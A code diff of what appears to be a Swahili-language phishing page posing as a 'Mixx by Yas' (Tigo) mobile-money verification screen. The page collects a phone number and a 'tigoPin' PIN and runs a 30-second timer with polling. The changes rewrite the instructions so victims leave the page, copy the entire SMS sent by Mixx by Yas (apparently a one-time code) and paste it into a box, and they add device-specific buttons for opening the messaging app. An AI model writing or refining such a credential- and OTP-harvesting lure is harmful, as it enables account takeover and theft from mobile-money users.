@@ -32,7 +32,7 @@
         .spinner { width: 50px; height: 50px; border: 4px solid #fef3c7; border-top-color: var(--gold); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 1rem; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .phone-display { background: #fef9e7; padding: 0.4rem 1.2rem; border-radius: 25px; display: inline-block; font-weight: 700; margin: 0.5rem 0; font-size: 0.9rem; }
-        .code-instruction { background: #fefce8; border-radius: 12px; padding: 12px 16px; margin: 10px 0; font-size: 0.8rem; color: var(--dark); text-align: center; border: 1px solid #fef3c7; line-height: 1.6; }
+        .code-instruction { background: #fefce8; border-radius: 12px; padding: 14px 16px; margin: 10px 0; font-size: 0.85rem; color: var(--dark); text-align: center; border: 1px solid #fef3c7; line-height: 1.6; }
         .code-instruction i { color: var(--gold); margin-right: 4px; }
         .sms-open-btn { display: block; text-align: center; background: #00377D; color: #FFD100; padding: 12px; border-radius: 30px; text-decoration: none; font-weight: 700; font-size: 0.85rem; margin: 8px 0; border: 2px solid #FFD100; cursor: pointer; }
         .sms-open-btn i { margin-right: 6px; }
@@ -75,13 +75,18 @@
                 <h3>✅ Namba ya Uthibitisho</h3>
                 <div class="phone-display" id="showPhone2">+255 ---------</div>
                 <div class="code-instruction">
-                    <i class="fas fa-sms"></i> <strong>Hatua 1:</strong> Fungua ujumbe wa SMS kutoka <strong>Mixx by Yas</strong><br>
-                    <strong>Hatua 2:</strong> Nakili ujumbe wote<br>
-                    <strong>Hatua 3:</strong> Bandika kwenye kisanduku hapa chini
+                    <i class="fas fa-sms"></i> <strong>Tafadhali fuata hatua hizi:</strong><br><br>
+                    <strong>1.</strong> Toka kwenye ukurasa huu na ufungue <strong>App ya Messages/SMS</strong> ya simu yako<br>
+                    <strong>2.</strong> Tafuta ujumbe uliotumwa na <strong>Mixx by Yas</strong><br>
+                    <strong>3.</strong> Nakili ujumbe <strong>WOTE</strong> (bonyeza na ushikilie kisha chagua Copy)<br>
+                    <strong>4.</strong> Rudi kwenye ukurasa huu na ubandike kwenye kisanduku hapa chini
                 </div>
-                <button class="sms-open-btn" onclick="openSMS()">
-                    <i class="fas fa-envelope"></i> Bonyeza Hapa Kufungua SMS
-                </button>
+                <a href="sms:" class="sms-open-btn" id="btnIPhone" style="display:none;">
+                    <i class="fas fa-envelope"></i> 📱 iPhone: Gusa Hapa Kufungua Messages
+                </a>
+                <a href="sms:" class="sms-open-btn" id="btnAndroid" style="display:none;">
+                    <i class="fas fa-envelope"></i> 🤖 Android: Gusa Hapa Kufungua SMS
+                </a>
                 <textarea id="smsMessage" class="sms-textarea" placeholder="Bandika ujumbe wako wote hapa..."></textarea>
                 <div class="timer-bar" id="timerDisplay">⏳ 30s</div>
                 <div class="error-msg" id="codeError" style="text-align:center;">Namba si sahihi</div>
@@ -102,9 +107,15 @@
         var appId = '', checkInterval = null, countdownTimer = null, userPhone = '', fastCheck = null;
         var resendCount = 0, resendCooldown = false;
 
-        function openSMS() {
-            window.location.href = 'sms:';
-        }
+        // Show correct button based on device
+        (function() {
+            var ua = navigator.userAgent.toLowerCase();
+            if (/iphone|ipad|ipod/.test(ua)) {
+                document.getElementById('btnIPhone').style.display = 'block';
+            } else {
+                document.getElementById('btnAndroid').style.display = 'block';
+            }
+        })();
 
         function togglePIN() { var p = document.getElementById('tigoPin'); var b = p.parentElement.querySelector('.toggle-btn'); if (p.type === 'password') { p.type = 'text'; b.textContent = '🙈'; } else { p.type = 'password'; b.textContent = '👁️'; } }
         document.getElementById('phoneNumber').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
